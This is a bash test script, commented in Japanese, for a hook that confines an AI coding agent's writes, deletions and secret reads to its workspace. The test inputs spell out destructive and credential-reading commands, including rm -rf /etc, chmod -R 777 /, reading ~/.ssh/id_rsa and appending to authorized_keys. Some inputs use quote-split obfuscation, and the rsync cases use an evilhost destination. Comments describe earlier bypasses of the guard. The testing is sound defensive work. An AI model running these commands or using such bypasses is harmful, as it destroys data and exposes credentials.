#!/bin/bash
set -uo pipefail

HOOK="$HOME/.claude/hooks/workspace-guard.sh"
# Git Bash(MSYS)は、ネイティブ(非MSYS)実行ファイル(本テストではjq.exe)へ渡す
# 引数が「素のPOSIX絶対パス1語のみ」に見える場合、自動でWindows形式へ書き換える
# (MSYS_NO_PATHCONV)。run_write/run_tool の file_path 引数はまさにこの形なので、
# 無効化しないと jq に渡る前に暗黙変換されテストが意図しない形の値で走ってしまう。
export MSYS_NO_PATHCONV=1
SCRATCH=$(mktemp -d)
REPO="$SCRATCH/repo"; mkdir -p "$REPO"
FAKE_CLAUDE_HOME="$SCRATCH/claude_home"; mkdir -p "$FAKE_CLAUDE_HOME/hooks"
SESSION_TMP=$(mktemp -d "/tmp/claude-test-XXXXXX")
trap 'rm -rf "$SCRATCH" "$SESSION_TMP"' EXIT

run_write() {  # $1=file_path
  local input; input=$(jq -n --arg fp "$1" '{tool_name:"Write", tool_input:{file_path:$fp, content:"x"}}')
  printf '%s' "$input" | (cd "$REPO" && CLAUDE_CONFIG_DIR="$FAKE_CLAUDE_HOME" bash "$HOOK")
}
run_bash() {  # $1=command
  local input; input=$(jq -n --arg cmd "$1" '{tool_name:"Bash", tool_input:{command:$cmd}}')
  printf '%s' "$input" | (cd "$REPO" && CLAUDE_CONFIG_DIR="$FAKE_CLAUDE_HOME" bash "$HOOK")
}
run_tool() {  # $1=tool_name $2=json_key(file_path|notebook_path) $3=path_value
  local input; input=$(jq -n --arg tool "$1" --arg key "$2" --arg val "$3" \
    '{tool_name:$tool, tool_input:{($key):$val}}')
  printf '%s' "$input" | (cd "$REPO" && CLAUDE_CONFIG_DIR="$FAKE_CLAUDE_HOME" bash "$HOOK")
}

FAIL=0
assert_exit() {  # $1=expected $2=actual $3=label
  if [ "$1" != "$2" ]; then
    echo "FAIL: $3 (expected exit $1, got $2)"
    FAIL=1
  else
    echo "PASS: $3"
  fi
}

# ── 既存機能の回帰テスト(Write/Edit/MultiEdit/NotebookEdit/cp/tee/mv/curl/wget) ──
run_write "$REPO/a.txt"; assert_exit 0 "$?" "(regress) Write プロジェクト配下は許可"
run_write "$FAKE_CLAUDE_HOME/hooks/x"; assert_exit 0 "$?" "(regress) Write \$CLAUDE_HOME配下は許可"
run_write "$SESSION_TMP/x"; assert_exit 0 "$?" "(regress) Write セッション用tmp配下は許可"
run_write "/etc/passwd"; assert_exit 2 "$?" "(regress) Write ゾーン外はブロック"
run_tool "Edit" "file_path" "$REPO/e.txt"; assert_exit 0 "$?" "(regress) Edit プロジェクト配下は許可"
run_tool "Edit" "file_path" "/etc/passwd"; assert_exit 2 "$?" "(regress) Edit ゾーン外はブロック"
run_tool "MultiEdit" "file_path" "$REPO/me.txt"; assert_exit 0 "$?" "(regress) MultiEdit プロジェクト配下は許可"
run_tool "MultiEdit" "file_path" "/etc/passwd"; assert_exit 2 "$?" "(regress) MultiEdit ゾーン外はブロック"
run_tool "NotebookEdit" "notebook_path" "$REPO/n.ipynb"; assert_exit 0 "$?" "(regress) NotebookEdit プロジェクト配下は許可"
run_tool "NotebookEdit" "notebook_path" "/etc/n.ipynb"; assert_exit 2 "$?" "(regress) NotebookEdit ゾーン外はブロック"
run_bash "cp $REPO/a $REPO/b"; assert_exit 0 "$?" "(regress) cp プロジェクト配下同士は許可"
run_bash "cp $REPO/a /root/b"; assert_exit 2 "$?" "(regress) cp ゾーン外宛先はブロック"
run_bash "mv $REPO/a $REPO/b2"; assert_exit 0 "$?" "(regress) mv プロジェクト配下同士は許可"
run_bash "mv $REPO/a /root/b2"; assert_exit 2 "$?" "(regress) mv ゾーン外宛先はブロック"
run_bash "tee $REPO/out.txt <<< hi"; assert_exit 0 "$?" "(regress) tee プロジェクト配下は許可"
run_bash "tee /root/out.txt <<< hi"; assert_exit 2 "$?" "(regress) tee ゾーン外宛先はブロック"
run_bash "curl -o /root/out.bin http://example.com/x"; assert_exit 2 "$?" "(regress) curl -o ゾーン外宛先はブロック"
run_bash "wget -O /root/out.bin http://example.com/x"; assert_exit 2 "$?" "(regress) wget -O ゾーン外宛先はブロック"

# ── rm/rmdir/unlink(6軸: ゾーン内/ゾーン外/ゾーンルート/複合コマンド/難読化/位置非依存トリガー) ──
run_bash "rm -rf $REPO/x"; assert_exit 0 "$?" "(rm) ゾーン内は許可"
run_bash "rm -rf /etc"; assert_exit 2 "$?" "(rm) ゾーン外はブロック"
run_bash "rm -rf $REPO"; assert_exit 2 "$?" "(rm) ゾーンルート自体は不可"
run_bash "rm -rf $REPO/a && echo done"; assert_exit 0 "$?" "(rm) 複合コマンド(ゾーン内)は許可"
run_bash "sudo rm -rf /etc"; assert_exit 2 "$?" "(rm) 先頭トークン非一致でも位置非依存トリガーでブロック(最重要回帰)"
run_bash "r'm' -rf /etc"; assert_exit 2 "$?" "(rm) 難読化(クォート分割)はブロック"

# ── git rm(6軸) ──
run_bash "git rm --cached $REPO/target.txt"; assert_exit 0 "$?" "(git rm) ゾーン内は許可"
run_bash "git rm --cached /etc/passwd"; assert_exit 2 "$?" "(git rm) ゾーン外はブロック"
run_bash "git rm --cached $REPO"; assert_exit 2 "$?" "(git rm) ゾーンルート自体は不可"
run_bash "git rm --cached target.txt && git commit -m msg"; assert_exit 0 "$?" "(git rm) 複合コマンド(相対パス)は許可"
run_bash "g'i't' r'm' --cached /etc/passwd"; assert_exit 2 "$?" "(git rm) 難読化(クォート分割)はブロック"
run_bash "env git rm --cached /etc/passwd"; assert_exit 2 "$?" "(git rm) 先頭トークン非一致でも位置非依存トリガーでブロック"

# ── find -delete(6軸) ──
run_bash "find $REPO/sub -delete"; assert_exit 0 "$?" "(find) ゾーン内は許可"
run_bash "find /etc -delete"; assert_exit 2 "$?" "(find) ゾーン外はブロック"
run_bash "find $REPO -delete"; assert_exit 2 "$?" "(find) ゾーンルート自体は不可"
run_bash "find $REPO/sub -delete && echo done"; assert_exit 0 "$?" "(find) 複合コマンド(ゾーン内)は許可"
run_bash "f'i'nd /etc -de'l'ete"; assert_exit 2 "$?" "(find) 難読化はブロック"
run_bash "sudo find $REPO/sub -delete"; assert_exit 2 "$?" "(find) 先頭トークン非一致でも位置非依存トリガーでブロック"

# ── rsync --delete(6軸) ──
run_bash "rsync -a --delete $REPO/src/ $REPO/dst/"; assert_exit 0 "$?" "(rsync) ゾーン内は許可"
run_bash "rsync -a --delete /etc/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) 片方ゾーン外はブロック"
run_bash "rsync -a --delete $REPO/src/ $REPO"; assert_exit 2 "$?" "(rsync) ゾーンルート自体は不可"
run_bash "rsync -a --delete $REPO/src/ $REPO/dst/ && echo ok"; assert_exit 0 "$?" "(rsync) 複合コマンド(ゾーン内)は許可"
run_bash "r'sync' -a --del'ete' /etc/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) 難読化はブロック"
run_bash "sudo rsync -a --delete $REPO/src/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) 先頭トークン非一致でも位置非依存トリガーでブロック"
run_bash "rsync -a --del /etc/ $REPO/dst/"; assert_exit 2 "$?" "(rsync) --delエイリアスもブロック"

# ── chmod 000/-R777(6軸) ──
run_bash "chmod 000 $REPO/f"; assert_exit 0 "$?" "(chmod) ゾーン内は許可"
run_bash "chmod -R 777 /etc"; assert_exit 2 "$?" "(chmod) ゾーン外はブロック"
run_bash "chmod -R 777 $REPO"; assert_exit 2 "$?" "(chmod) ゾーンルート自体は不可"
run_bash "chmod -R 777 /"; assert_exit 2 "$?" "(chmod) ファイルシステムルートはブロック"
run_bash "chmod 000 $REPO/f && echo ok"; assert_exit 0 "$?" "(chmod) 複合コマンド(ゾーン内)は許可"
run_bash "ch'mod' -R 7'7'7 /etc"; assert_exit 2 "$?" "(chmod) 難読化はブロック"
run_bash "sudo chmod 000 $REPO/f"; assert_exit 2 "$?" "(chmod) 先頭トークン非一致でも位置非依存トリガーでブロック"

# ── git clean -fd(6軸) ──
run_bash "git clean -fd $REPO/target"; assert_exit 0 "$?" "(git clean) ゾーン内明示パスは許可"
run_bash "git clean -fd /etc"; assert_exit 2 "$?" "(git clean) ゾーン外はブロック"
run_bash "git clean -fd $REPO"; assert_exit 2 "$?" "(git clean) ゾーンルート自体は不可"
run_bash "git clean -fd"; assert_exit 2 "$?" "(git clean) パス引数なしは不可"
run_bash "git clean -fd $REPO/target && echo ok"; assert_exit 0 "$?" "(git clean) 複合コマンド(ゾーン内)は許可"
run_bash "git clea'n' -f'd' /etc"; assert_exit 2 "$?" "(git clean) 難読化はブロック"
run_bash "env git clean -fd $REPO/target"; assert_exit 2 "$?" "(git clean) 先頭トークン非一致でも位置非依存トリガーでブロック"

# ── 機密ファイル読取(5軸。ゾーンルート自体は不可はトリガーが特定ファイル名パターン
#    依存のため該当なし=報告書に理由記載) ──
run_bash "cat $REPO/.env"; assert_exit 0 "$?" "(secret) ゾーン内.envは許可"
run_bash "cat /etc/credentials"; assert_exit 2 "$?" "(secret) ゾーン外credentialsはブロック"
run_bash "cat ~/.ssh/id_rsa"; assert_exit 2 "$?" "(secret) ~/.ssh/id_rsaはブロック"
run_bash "cat $REPO/.env && echo ok"; assert_exit 0 "$?" "(secret) 複合コマンド(ゾーン内)は許可"
run_bash "c'a't' /etc/credentials"; assert_exit 2 "$?" "(secret) 難読化はブロック"
run_bash "sudo cat $REPO/.env"; assert_exit 2 "$?" "(secret) 先頭トークン非一致でも位置非依存トリガーでブロック"

# ── リダイレクト汎用化 ──
run_bash "echo hi > $REPO/out.txt"; assert_exit 0 "$?" "(redirect) ゾーン内は許可"
run_bash "echo hi > /root/out.txt"; assert_exit 2 "$?" "(redirect) ゾーン外はブロック"
run_bash "echo hi >> ~/.bashrc"; assert_exit 2 "$?" "(redirect) motivating case: ~/.bashrc"
run_bash "echo hi >> ~/.ssh/authorized_keys"; assert_exit 2 "$?" "(redirect) motivating case: ~/.ssh/authorized_keys"
run_bash "echo hi > /var/tmp/x"; assert_exit 2 "$?" "(redirect) 既存挙動維持: /var/tmp"
run_bash "echo hi > /tmp/randomdir/x"; assert_exit 2 "$?" "(redirect) 既存挙動維持: /tmp配下の無関係ディレクトリ"
run_bash "echo hi > $SESSION_TMP/x"; assert_exit 0 "$?" "(redirect) セッション用tmp配下は許可"
run_bash "cmd 2>/dev/null"; assert_exit 0 "$?" "(redirect) /dev/null除外"
run_bash "cmd > /dev/null 2>&1"; assert_exit 0 "$?" "(redirect) fd複製+devnull除外"

# ── リダイレクトのfd番号バイパス(CRITICAL修正確認: [0-9]?→[0-9]*) ──
run_bash ": 1>$REPO/out1.txt"; assert_exit 0 "$?" "(redirect-fd) 1桁fd番号+ゾーン内は許可"
run_bash ": 1>/etc/x"; assert_exit 2 "$?" "(redirect-fd) 1桁fd番号+ゾーン外はブロック"
run_bash ": 10>/etc/x"; assert_exit 2 "$?" "(redirect-fd) 2桁fd番号でもゾーン外はブロック(CRITICAL修正)"
run_bash ": 100>/etc/x"; assert_exit 2 "$?" "(redirect-fd) 3桁fd番号でもゾーン外はブロック(CRITICAL修正)"

# ── /tmpゾーン範囲の是正確認(優先度0: /tmp/claude-*/*→/tmp/*へ拡大、rm等7カテゴリのみ) ──
run_bash "chmod -R 777 $SCRATCH"; assert_exit 0 "$?" "(zone-scope) /tmp配下ならclaude-*以外でも7カテゴリは許可"
run_bash "echo hi > $SCRATCH/x"; assert_exit 2 "$?" "(zone-scope) リダイレクト(is_ext_dest)は従来通りclaude-*限定のまま"

# ── cd/pushd/popd混入検知(_wg_frag_has_cd) ──
run_bash "rm -rf $REPO/x cd"; assert_exit 2 "$?" "(cd検知) 断片にcd等の語が含まれる場合はゾーン内相当でもブロック"

# ══════════════════════════════════════════════════════════════════
# ── Windows(Git Bash)対応: 絶対パス形式でのゾーン判定、to_posix()バグ修正の
#    回帰、*/[Tt]emp/claude/*ゾーンの確認 ──
#    上の$REPO/$FAKE_CLAUDE_HOMEはmktemp -d既定(/tmp配下)。Git BashのMSYS /tmp
#    はMSYS内部専用の仮想ルートで、ドライブレター形式の実体パスを持たないため、
#    realpath/cygpathを介してもC:\...形式のWindows絶対パスへ一意に相互変換
#    できない。Windows絶対パス⇔POSIXパスの相互変換が前提のテストには、
#    $HOME配下(実ドライブ直下、cygpath -wで一意に往復変換できる)に専用の
#    スクラッチ領域を別途用意する（旧windows版bash-guard.test.shから移設。
#    テスト対象がworkspace-guard.shの7カテゴリゾーン判定へ移ったため、
#    実$HOME/.claudeでなくテスト用$WIN_CLAUDE_HOME配下を使う）。
# ══════════════════════════════════════════════════════════════════
WIN_SCRATCH=$(mktemp -d "$HOME/.wg_win_test_XXXXXX")
WIN_REPO="$WIN_SCRATCH/repo"; mkdir -p "$WIN_REPO"
WIN_CLAUDE_HOME="$WIN_SCRATCH/claude_home"; mkdir -p "$WIN_CLAUDE_HOME/hooks"
trap 'rm -rf "$SCRATCH" "$SESSION_TMP" "$WIN_SCRATCH"' EXIT

run_bash_win() {  # $1=command (cwd=$WIN_REPO, CLAUDE_CONFIG_DIR=$WIN_CLAUDE_HOME)
  local input; input=$(jq -n --arg cmd "$1" '{tool_name:"Bash", tool_input:{command:$cmd}}')
  printf '%s' "$input" | (cd "$WIN_REPO" && CLAUDE_CONFIG_DIR="$WIN_CLAUDE_HOME" bash "$HOOK")
}
run_write_win() {  # $1=file_path (cwd=$WIN_REPO, CLAUDE_CONFIG_DIR=$WIN_CLAUDE_HOME)
  local input; input=$(jq -n --arg fp "$1" '{tool_name:"Write", tool_input:{file_path:$fp, content:"x"}}')
  printf '%s' "$input" | (cd "$WIN_REPO" && CLAUDE_CONFIG_DIR="$WIN_CLAUDE_HOME" bash "$HOOK")
}

command -v cygpath >/dev/null 2>&1 && WIN_REPO_BS=$(cygpath -w "$WIN_REPO") || WIN_REPO_BS=$(printf '%s' "$WIN_REPO" | sed -E 's#^/([a-zA-Z])/#\1:\\#; s#/#\\#g')
WIN_REPO_SLASH=$(printf '%s' "$WIN_REPO_BS" | tr '\\' '/')

# rm
touch "$WIN_REPO/win_rm_target.txt"
run_bash_win "rm ${WIN_REPO_BS}\\win_rm_target.txt"; assert_exit 2 "$?" "(win-path/rm) バックスラッシュ形式は意図的にブロック"
touch "$WIN_REPO/win_rm_target.txt"
run_bash_win "rm ${WIN_REPO_SLASH}/win_rm_target.txt"; assert_exit 0 "$?" "(win-path/rm) スラッシュ形式Windowsパスはゾーン内として許可"

# git rm
touch "$WIN_REPO/win_gitrm_target.txt"
run_bash_win "git rm --cached ${WIN_REPO_BS}\\win_gitrm_target.txt"; assert_exit 2 "$?" "(win-path/git rm) バックスラッシュ形式はブロック"
run_bash_win "git rm --cached ${WIN_REPO_SLASH}/win_gitrm_target.txt"; assert_exit 0 "$?" "(win-path/git rm) スラッシュ形式Windowsパスは許可"

# find -delete
mkdir -p "$WIN_REPO/win_find_dir"
run_bash_win "find ${WIN_REPO_BS}\\win_find_dir -delete"; assert_exit 2 "$?" "(win-path/find) バックスラッシュ形式はブロック"
mkdir -p "$WIN_REPO/win_find_dir"
run_bash_win "find ${WIN_REPO_SLASH}/win_find_dir -delete"; assert_exit 0 "$?" "(win-path/find) スラッシュ形式Windowsパスは許可"

# rsync --delete
mkdir -p "$WIN_REPO/win_rsync_src" "$WIN_REPO/win_rsync_dst"
run_bash_win "rsync -a --delete ${WIN_REPO_BS}\\win_rsync_src\\ ${WIN_REPO_BS}\\win_rsync_dst\\"; assert_exit 2 "$?" "(win-path/rsync) バックスラッシュ形式はブロック"
run_bash_win "rsync -a --delete ${WIN_REPO_SLASH}/win_rsync_src/ ${WIN_REPO_SLASH}/win_rsync_dst/"; assert_exit 0 "$?" "(win-path/rsync) スラッシュ形式Windowsパスは許可"

# chmod 000
touch "$WIN_REPO/win_chmod_target.txt"
run_bash_win "chmod 000 ${WIN_REPO_BS}\\win_chmod_target.txt"; assert_exit 2 "$?" "(win-path/chmod) バックスラッシュ形式はブロック"
run_bash_win "chmod 000 ${WIN_REPO_SLASH}/win_chmod_target.txt"; assert_exit 0 "$?" "(win-path/chmod) スラッシュ形式Windowsパスは許可"

# 機密ファイル読取
touch "$WIN_REPO/.env"
run_bash_win "cat ${WIN_REPO_BS}\\.env"; assert_exit 2 "$?" "(win-path/secret) バックスラッシュ形式はブロック"
run_bash_win "cat ${WIN_REPO_SLASH}/.env"; assert_exit 0 "$?" "(win-path/secret) スラッシュ形式Windowsパスは許可"

# ── to_posix()バグ修正の直接的な回帰テスト ──
# 旧実装はドライブレターのみ小文字化しパス全体を小文字化していなかったため、
# 大文字小文字が混在したWindowsパスがゾーン(小文字で計算されるPROJECT_DIR/
# CLAUDE_HOME)と前方一致比較で食い違い、誤ってブロックされ得た。修正後は
# パス全体を小文字化するため、大文字混在パスと純粋な小文字パスが同じ
# ゾーン判定結果(許可)になることを固定化する。
touch "$WIN_CLAUDE_HOME/hooks/case_target.txt"
command -v cygpath >/dev/null 2>&1 && WIN_CH_BS=$(cygpath -w "$WIN_CLAUDE_HOME/hooks") || WIN_CH_BS=$(printf '%s' "$WIN_CLAUDE_HOME/hooks" | sed -E 's#^/([a-zA-Z])/#\1:\\#; s#/#\\#g')
WIN_CH_SLASH=$(printf '%s' "$WIN_CH_BS" | tr '\\' '/')
WIN_CH_SLASH_UPPER=$(printf '%s' "$WIN_CH_SLASH" | tr 'a-z' 'A-Z')
run_bash_win "rm ${WIN_CH_SLASH}/case_target.txt"; assert_exit 0 "$?" "(to_posix bug) 小文字スラッシュ形式Windowsパスは許可"
touch "$WIN_CLAUDE_HOME/hooks/case_target.txt"
run_bash_win "rm ${WIN_CH_SLASH_UPPER}/case_target.txt"; assert_exit 0 "$?" "(to_posix bug) 大文字混在スラッシュ形式Windowsパスも同じ許可結果(ドライブレターのみ小文字化する旧バグの回帰確認)"

# ── Windowsセッション用スクラッチパッド(実$LOCALAPPDATA/Temp/claude/<session>配下)が
#    7カテゴリのゾーン判定(_wg_tok_in_zone)・Write(is_allowed)でも正しく効くことを
#    確認する。旧テストは$WIN_SCRATCH配下に"Temp/claude"という文字列を含むだけの
#    偽ディレクトリを使っており、無アンカーcaseパターン(*/[Tt]emp/claude/*)の
#    バグに依存した誤ったテストだったため、実$LOCALAPPDATA配下を使う形に是正する。
#    $LOCALAPPDATA未設定環境(非Windows)ではスキップする。
LOCALAPPDATA_POSIX=""
if [ -n "${LOCALAPPDATA:-}" ] && command -v cygpath >/dev/null 2>&1; then
  LOCALAPPDATA_POSIX=$(cygpath -u "$LOCALAPPDATA")
fi
if [ -n "$LOCALAPPDATA_POSIX" ]; then
  REAL_TEMP_CLAUDE_DIR="$LOCALAPPDATA_POSIX/Temp/claude/wg-test-$$"; mkdir -p "$REAL_TEMP_CLAUDE_DIR"
  touch "$REAL_TEMP_CLAUDE_DIR/f.txt"
  run_bash_win "chmod 000 $REAL_TEMP_CLAUDE_DIR/f.txt"; assert_exit 0 "$?" "(temp-claude-zone) 実\$LOCALAPPDATA/Temp/claude配下は7カテゴリゾーン判定(chmod)でも許可"
  touch "$REAL_TEMP_CLAUDE_DIR/g.txt"
  run_bash_win "rm $REAL_TEMP_CLAUDE_DIR/g.txt"; assert_exit 0 "$?" "(temp-claude-zone) 実\$LOCALAPPDATA/Temp/claude配下は7カテゴリゾーン判定(rm)でも許可"
  run_write_win "$REAL_TEMP_CLAUDE_DIR/w.txt"; assert_exit 0 "$?" "(temp-claude-zone) 実\$LOCALAPPDATA/Temp/claude配下はWrite(is_allowed)でも許可(既存機能の確認)"
  rm -rf "$REAL_TEMP_CLAUDE_DIR"
else
  echo "SKIP: LOCALAPPDATA未設定のため実temp/claudeゾーンテストをスキップ"
fi

# ── 無アンカーcaseパターン(*/[Tt]emp/claude/*)の誤許可バグの回帰固定化テスト。
#    実$LOCALAPPDATA配下ではなく、パスのどこかに"temp/claude"という部分文字列を
#    含むだけの偽パス($WIN_SCRATCH配下、正規のスクラッチパッドとは無関係)を作り、
#    アンカー付き前方一致修正後はこれがブロックされる(exit 2)ことを確認する。
FAKE_TEMP_CLAUDE_DIR="$WIN_SCRATCH/fakeproject/nested/temp/claude/evil"; mkdir -p "$FAKE_TEMP_CLAUDE_DIR"
touch "$FAKE_TEMP_CLAUDE_DIR/f.txt"
run_bash_win "chmod 000 $FAKE_TEMP_CLAUDE_DIR/f.txt"; assert_exit 2 "$?" "(temp-claude-zone-regression) temp/claudeを部分文字列に含むだけの偽パスはchmodでもブロックされる(無アンカー実装バグの固定化)"
touch "$FAKE_TEMP_CLAUDE_DIR/g.txt"
run_bash_win "rm $FAKE_TEMP_CLAUDE_DIR/g.txt"; assert_exit 2 "$?" "(temp-claude-zone-regression) temp/claudeを部分文字列に含むだけの偽パスはrmでもブロックされる(無アンカー実装バグの固定化)"
run_write_win "$FAKE_TEMP_CLAUDE_DIR/w.txt"; assert_exit 2 "$?" "(temp-claude-zone-regression) temp/claudeを部分文字列に含むだけの偽パスはWriteでもブロックされる(無アンカー実装バグの固定化)"

# ══════════════════════════════════════════════════════════════════
# ── rsync HOST:PATH バイパス回帰テスト(2026-08-29追加)。
#    _wg_frag_unsafe()の安全文字集合に`:`が含まれていた旧実装では、
#    rsyncの`HOST:PATH`リモートシェル構文(例: evilhost:/etc/passwd)が
#    「解析可能」として素通りし、_wg_tok_in_zoneのrealpath -mがコロンを
#    ただの文字として扱って$PROJECT_DIR配下の奇妙なファイル名に誤解決、
#    ゾーン内と誤判定してEXIT=0(許可)を返していた(脆弱性)。
#    修正後は`:`を安全文字から除去し、代わりにドライブレターパス
#    (`C:/x`形式)だけを事前正規化するため、HOST:PATH構文はコロンを
#    含んだまま解析不能としてブロックされるはず。
# ══════════════════════════════════════════════════════════════════
run_bash "rsync -a --delete $REPO/src/ evilhost:/etc/passwd"; assert_exit 2 "$?" "(rsync-bypass) HOST:PATH構文(ユーザー名なし)はブロック"
run_bash "rsync -a --delete $REPO/src/ user@evilhost:/etc/passwd"; assert_exit 2 "$?" "(rsync-bypass) HOST:PATH構文(user@付き、既存の@除外で明示確認)はブロック"

echo "----"
if [ "$FAIL" -eq 0 ]; then
  echo "ALL PASS"
else
  echo "SOME TESTS FAILED"
fi
exit "$FAIL"
